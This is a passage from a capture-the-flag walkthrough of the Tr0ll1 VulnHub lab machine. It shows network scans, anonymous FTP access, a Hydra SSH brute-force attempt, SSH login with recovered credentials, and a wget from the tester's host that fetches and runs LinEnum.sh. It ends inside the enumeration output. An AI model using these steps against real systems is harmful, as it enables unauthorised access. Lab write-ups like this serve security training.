@@ -1,0 +1,2004 @@
+====================================================================================
+Walkthrough of the TR0LL1 VulnHub VM CTF
+====================================================================================
+
+Step 1. Scanning & Enumeration (Nmap + Nikto + Dirb + Searchsploit)
+
+
+Step 2. Gaining access
+	=> FTP anonymous access > manual pentest > find SSH credentials stored in hidden files on the Webserver
+
+
+Step 3. Linux enumeration (LinEnum.sh + Linux-exploit-suggester.sh)
+
+
+Step 4. Privilege escalation to root
+
+        + Method 1 - Privesc using a World writeable python script owned by root and executed via cron (by root)
+	
+	+ Method 2 - Overlayfs exploit (CVE-2015-1328)
+	
+	+ Method 3 - DirtyC0w exploit (CVE-2016-5195)
+ 		   => It works but the the Linux server crashes..
+
+
+====================================================================================
+Step 1. Scanning & Enumeration (Nmap + Nikto + Dirb + Searchsploit)
+====================================================================================
+
+
+root@Security-Audit-01:~# netdiscover
+
+ Currently scanning: 192.168.28.0/16   |   Screen View: Unique Hosts           
+                                                                               
+ 5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.23    08:00:27:f9:8d:be      1      60  PCS Systemtechnik GmbH      
+ 192.168.1.29    f4:5c:89:c9:be:c5      1      60  Apple, Inc.                 
+ 192.168.1.33    28:3f:69:c8:fc:15      1      60  Sony Mobile Communications A
+ 192.168.1.254   68:a3:78:8b:0c:dd      2     120  FREEBOX SAS                 
+
+====================================================================================
+
+root@Security-Audit-01:~# nmap -T5 -sS -sV -sC -p- 192.168.1.23
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-16 22:26 CEST
+Nmap scan report for 192.168.1.23
+Host is up (0.00010s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.1.8
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 600
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 5
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
+|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
+|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
+|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/secret
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:F9:8D:BE (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
+
+====================================================================================
+
+root@Security-Audit-01:~# nmap -T5 -sV -script vuln -p 21,22,80 192.168.1.23
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-16 22:28 CEST
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Nmap scan report for 192.168.1.23
+Host is up (0.00041s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+|_sslv2-drown: 
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /robots.txt: Robots file
+|_  /secret/: Potentially interesting folder
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+MAC Address: 08:00:27:F9:8D:BE (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 351.43 seconds
+
+====================================================================================
+
+root@Security-Audit-01:~# searchsploit vsFTPd
+----------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                         |  Path
+                                                                       | (/usr/share/exploitdb/)
+----------------------------------------------------------------------- ----------------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption         | exploits/linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)         | exploits/windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)         | exploits/windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service                                       | exploits/linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                 | exploits/unix/remote/17491.rb
+----------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+The version 3.0.2 of vsFTPd is not vulnerable 
+
+====================================================================================
+
+root@Security-Audit-01:~# searchsploit OpenSSH 6.6.1p1
+Exploits: No Result
+Shellcodes: No Result
+root@Security-Audit-01:~# searchsploit OpenSSH
+----------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                         |  Path
+                                                                       | (/usr/share/exploitdb/)
+----------------------------------------------------------------------- ----------------------------------------
+Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation   | exploits/linux/remote/6094.txt
+Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service     | exploits/multiple/dos/1572.pl
+FreeBSD OpenSSH 3.5p1 - Remote Command Execution                       | exploits/freebsd/remote/17462.txt
+Novell Netware 6.5 - OpenSSH Remote Stack Overflow                     | exploits/novell/dos/14866.txt
+OpenSSH 1.2 - '.scp' File Create/Overwrite                             | exploits/linux/remote/20253.sh
+OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                      | exploits/unix/remote/21314.txt
+OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow             | exploits/linux/remote/21402.txt
+OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                   | exploits/unix/remote/21578.txt
+OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                   | exploits/unix/remote/21579.txt
+OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service             | exploits/multiple/dos/2444.sh
+OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                   | exploits/linux/local/41173.c
+OpenSSH 7.2 - Denial of Service                                        | exploits/linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                | exploits/multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration                                   | exploits/linux/remote/40136.py
+OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domai | exploits/linux/local/40962.txt
+OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading               | exploits/linux/remote/40963.txt
+OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                    | exploits/linux/remote/26.sh
+OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                      | exploits/linux/remote/25.c
+OpenSSHd 7.2p2 - Username Enumeration                                  | exploits/linux/remote/40113.txt
+Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                   | exploits/multiple/remote/3303.sh
+glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                 | exploits/linux/local/258.sh
+----------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+
+=> The version 6.6.1p1 of OpenSSH is not vulnerable 
+
+====================================================================================
+
+root@Security-Audit-01:~# dirb http://192.168.1.23
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Sep 16 22:40:26 2018
+URL_BASE: http://192.168.1.23/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.1.23/ ----
++ http://192.168.1.23/index.html (CODE:200|SIZE:36)                                                            
++ http://192.168.1.23/robots.txt (CODE:200|SIZE:31)                                                            
+==> DIRECTORY: http://192.168.1.23/secret/                                                                     
++ http://192.168.1.23/server-status (CODE:403|SIZE:292)                                                        
+                                                                                                               
+---- Entering directory: http://192.168.1.23/secret/ ----
++ http://192.168.1.23/secret/index.html (CODE:200|SIZE:37)                                                     
+                                                                                                               
+-----------------
+END_TIME: Sun Sep 16 22:40:31 2018
+DOWNLOADED: 9224 - FOUND: 4
+
+====================================================================================
+
+root@Security-Audit-01:~# nikto -h  http://192.168.1.23
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.23
++ Target Hostname:    192.168.1.23
++ Target Port:        80
++ Start Time:         2018-09-16 22:40:50 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x24 0x500438fe37ded 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/secret/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3092: /secret/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7536 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2018-09-16 22:41:13 (GMT2) (23 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+===================================================================================================================
+Step 2. Gaining access
+	=> FTP anonymous access > manual pentest > find SSH credentials stored in hidden files on the Webserver
+
+===================================================================================================================
+
+
+Step 1. Testing FTP anonymous access
+-------------------------------------
+
+root@Security-Audit-01:~# ftp 192.168.1.23 21
+Connected to 192.168.1.23.
+220 (vsFTPd 3.0.2)
+Name (192.168.1.23:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
+226 Directory send OK.
+
+ftp> cd /
+250 Directory successfully changed.
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
+226 Directory send OK.
+
+ftp> pwd
+257 "/"
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
+226 Directory send OK.
+
+ftp> get lol.pcap
+local: lol.pcap remote: lol.pcap
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
+226 Transfer complete.
+8068 bytes received in 0.00 secs (3.1038 MB/s)
+
+ftp> binary
+200 Switching to Binary mode.
+ftp> put test.txt
+local: test.txt remote: test.txt
+200 PORT command successful. Consider using PASV.
+550 Permission denied.
+
+ftp> exit
+221 Goodbye.
+
+
+Step 2
+-------
+I found a "LOL.PCAP" file.
+I did a "STRINGS" command to look for strings in the file and I found 2 potentially clues:
+=> sup3rs3cr3tdirlol
+=> secret_stuff.txt
+
+root@Security-Audit-01:~# strings lol.pcap 
+
+Linux 3.12-kali1-486
+Dumpcap 1.10.2 (SVN Rev 51934 from /trunk-1.10)
+eth0	
+host 10.0.0.6
+Linux 3.12-kali1-486
+220 (vsFTPd 3.0.2)
+"USER anonymous
+331 Please specify the password.
+PASS password
+230 Login successful.
+SYST
+215 UNIX Type: L8
+PORT 10,0,0,12,173,198
+200 PORT command successful. Consider using PASV.
+LIST
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
+226 Directory send OK.
+TYPE I
+W200 Switching to Binary mode.
+PORT 10,0,0,12,202,172
+g>	@
+W200 PORT command successful. Consider using PASV.
+RETR secret_stuff.txt
+W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
+WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
+Sucks, you were so close... gotta TRY HARDER!
+W226 Transfer complete.
+TYPE A
+O200 Switching to ASCII mode.
+{PORT 10,0,0,12,172,74
+O200 PORT command successful. Consider using PASV.
+{LIST
+O150 Here comes the directory listing.
+O-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
+O226 Directory send OK.
+{QUIT
+221 Goodbye.
+Counters provided by dumpcap
+
+Step 3
+-------
+
+=> I tried to browse the directory 'sup3rs3cr3tdirlol' and I found the file 'roflmao'
+=> http://192.168.1.23/sup3rs3cr3tdirlol/
+
+root@Security-Audit-01:~# curl -v http://192.168.1.23/sup3rs3cr3tdirlol/
+*   Trying 192.168.1.23...
+* TCP_NODELAY set
+* Connected to 192.168.1.23 (192.168.1.23) port 80 (#0)
+> GET /sup3rs3cr3tdirlol/ HTTP/1.1
+> Host: 192.168.1.23
+> User-Agent: curl/7.60.0
+> Accept: */*
+
+< HTTP/1.1 200 OK
+< Date: Sun, 16 Sep 2018 20:52:51 GMT
+< Server: Apache/2.4.7 (Ubuntu)
+< Vary: Accept-Encoding
+< Content-Length: 957
+< Content-Type: text/html;charset=UTF-8
+< 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /sup3rs3cr3tdirlol</title>
+ </head>
+ <body>
+<h1>Index of /sup3rs3cr3tdirlol</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="roflmao">roflmao</a></td><td align="right">2014-08-11 18:45  </td><td align="right">7.1K</td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.7 (Ubuntu) Server at 192.168.1.23 Port 80</address>
+</body></html>
+* Connection #0 to host 192.168.1.23 left intact
+
+Step 4
+--------
+I did a STRINGS and a FILE on the file 'roflmao'
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# strings roflmao 
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+printf
+__libc_start_main
+__gmon_start__
+GLIBC_2.0
+PTRh
+[^_]
+Find address 0x0856BF to proceed
+;*2$"
+GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got
+.got.plt
+.data
+.bss
+.comment
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+completed.6590
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+roflmao.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+__x86.get_pc_thunk.bx
+data_start
+printf@@GLIBC_2.0
+_edata
+_fini
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_start_main@@GLIBC_2.0
+__libc_csu_init
+_end
+_start
+_fp_hw
+__bss_start
+main
+_Jv_RegisterClasses
+__TMC_END__
+_ITM_registerTMCloneTable
+_init
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# file roflmao
+roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
+
+Note: the file is an ".elf" executable so I renamed it and executed.
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# mv roflmao roflmao.elf
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ./roflmao.elf 
+Find address 0x0856BF to proceed
+
+
+Step 5
+--------
+
+I tried '0x0856BF' as a directory on the web server and found new directory and files:
+
+=> http://192.168.1.23/0x0856BF/good_luck/which_one_lol.txt
+	male-us
+	ps-aux
+	felux
+	Eagle11
+	genphlux < -- Definitely not this one
+	usmc8892
+	blawrg
+	wytshadow
+	vis1t0r
+	overflow
+
+=> http://192.168.1.23/0x0856BF/this_folder_contains_the_password/Pass.txt
+	Good_job_:)
+
+
+Step 6
+--------
+I build a user.txt and pass.txt with all the information we got.
+
+user.txt
+________
+root
+maleus
+ps-aux
+felux	
+Eagle11
+genphlux
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow
+0x0856BF
+good_luck
+Tr0ll
+Tr0ll1
+
+pass.txt
+_________
+Good_job_:)
+Pass.txt
+which_one_lol.txt
+good_luck
+
+I used Hydra to bruteforce the SSH and FTP servers with our list:
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# hydra -v -t 4 -I -L user.txt -p Pass.txt 192.168.1.23 ssh
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-09-16 23:33:13
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:15/p:1), ~4 tries per task
+[DATA] attacking ssh://192.168.1.23:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://root@192.168.1.23:22
+[INFO] Successful, password authentication is supported by ssh://192.168.1.23:22
+[ERROR] could not connect to target port 22: Connection refused
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 3
+[ERROR] could not connect to target port 22: Connection refused
+
+
+There is a filtering rule that blocks our SSH connections after a few attempts...
+
+So I tried manually the different potential credentials and found a valid a couple login:password  
+=> overflow:Pass.txt
+
+======================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+overflow@192.168.1.23's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
+Could not chdir to home directory /home/overflow: No such file or directory
+$ 
+
+$ uname -a
+Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
+
+$ ls
+bin   dev  home        lib	   media  opt	root  sbin  sys  usr  vmlinuz
+boot  etc  initrd.img  lost+found  mnt	  proc	run   srv   tmp  var
+$ cd /tmp
+$  
+                                                                             
+Broadcast Message from root@trol                                               
+        (somewhere) at 14:40 ...                                               
+                                                                               
+TIMES UP LOL!                                                                  
+                                                                               
+Connection to 192.168.1.23 closed by remote host.
+Connection to 192.168.1.23 closed.
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh o
+
+============================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+overflow@192.168.1.23's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+<SNIP>
+
+$ wget http://192.168.1.8:8000/LinEnum.sh
+--2018-09-16 14:48:48--  http://192.168.1.8:8000/LinEnum.sh
+Connecting to 192.168.1.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 44413 (43K) [text/x-sh]
+Saving to: ‘LinEnum.sh’
+
+100%[======================================================================>] 44,413      --.-K/s   in 0s      
+
+2018-09-16 14:48:48 (632 MB/s) - ‘LinEnum.sh’ saved [44413/44413]
+
+$ chmod +x LinEnum.sh
+$ ./LinEnum.sh -t > LinEnum.txt
+$ cat LinEnum.txt
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.91
+
+[-] Debug Info
+[+] Thorough tests = Enabled
+
+
+Scan started at:
+Sun Sep 16 14:49:28 PDT 2018
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 3.13.0-32-generic (buildd@roseapple) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=14.04
+DISTRIB_CODENAME=trusty
+DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
+NAME="Ubuntu"
+VERSION="14.04.1 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.1 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+
+
+[-] Hostname:
+troll
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+troll            pts/0    10.0.0.12        Wed Aug 13 01:22:38 -0700 2014
+overflow         pts/0    192.168.1.8      Sun Sep 16 14:47:11 -0700 2018
+ps-aux           pts/2    10.0.0.12        Sat Aug  9 23:28:19 -0700 2014
+maleus           pts/2    10.0.0.12        Sat Aug  9 23:27:04 -0700 2014
+felux            pts/2    10.0.0.12        Sat Aug  9 23:28:32 -0700 2014
+Eagle11          pts/2    10.0.0.12        Sat Aug  9 23:31:15 -0700 2014
+genphlux         pts/2    10.0.0.12        Sat Aug  9 23:29:11 -0700 2014
+usmc8892         pts/2    10.0.0.12        Sat Aug  9 23:29:29 -0700 2014
+blawrg           pts/2    10.0.0.12        Sat Aug  9 23:29:46 -0700 2014
+wytshadow        pts/2    10.0.0.12        Sat Aug  9 23:30:05 -0700 2014
+vis1t0r          pts/2    10.0.0.12        Sat Aug  9 23:30:20 -0700 2014
+
+
+[-] Who else is logged on:
+ 14:49:28 up 16 min,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+overflow pts/0    192.168.1.8      14:47    8.00s  0.00s  0.00s /bin/bash ./LinEnum.sh -t
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
+uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)
+uid=102(messagebus) gid=105(messagebus) groups=105(messagebus)
+uid=1000(troll) gid=1000(troll) groups=1000(troll),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+uid=103(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=104(ftp) gid=112(ftp) groups=112(ftp)
+uid=1001(lololol) gid=1001(lololol) groups=1001(lololol)
+uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
+uid=1003(ps-aux) gid=1003(ps-aux) groups=1003(ps-aux)
+uid=1004(maleus) gid=1004(maleus) groups=1004(maleus)
+uid=1005(felux) gid=1005(felux) groups=1005(felux)
+uid=1006(Eagle11) gid=1006(Eagle11) groups=1006(Eagle11)
+uid=1007(genphlux) gid=1007(genphlux) groups=1007(genphlux)
+uid=1008(usmc8892) gid=1008(usmc8892) groups=1008(usmc8892)
+uid=1009(blawrg) gid=1009(blawrg) groups=1009(blawrg)
+uid=1010(wytshadow) gid=1010(wytshadow) groups=1010(wytshadow)
+uid=1011(vis1t0r) gid=1011(vis1t0r) groups=1011(vis1t0r)
+
+
+[-] It looks like we have some admin users:
+uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)
+uid=1000(troll) gid=1000(troll) groups=1000(troll),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+troll:x:1000:1000:Tr0ll,,,:/home/troll:/bin/bash
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:104:112:ftp daemon,,,:/srv/ftp:/bin/false
+lololol:x:1001:1001::/home/lololol:
+overflow:x:1002:1002::/home/overflow:
+ps-aux:x:1003:1003::/home/ps-aux:
+maleus:x:1004:1004::/home/maleus:
+felux:x:1005:1005::/home/felux:
+Eagle11:x:1006:1006::/home/Eagle11:
+genphlux:x:1007:1007::/home/genphlux:
+usmc8892:x:1008:1008::/home/usmc8892:
+blawrg:x:1009:1009::/home/blawrg:
+wytshadow:x:1010:1010::/home/wytshadow:
+vis1t0r:x:1011:1011::/home/vis1t0r:
+
+
+[-] Super user account(s):
+root
+
+
+[-] Are permissions on /home directories lax:
+total 12K
+drwxr-xr-x  3 root  root  4.0K Aug  9  2014 .
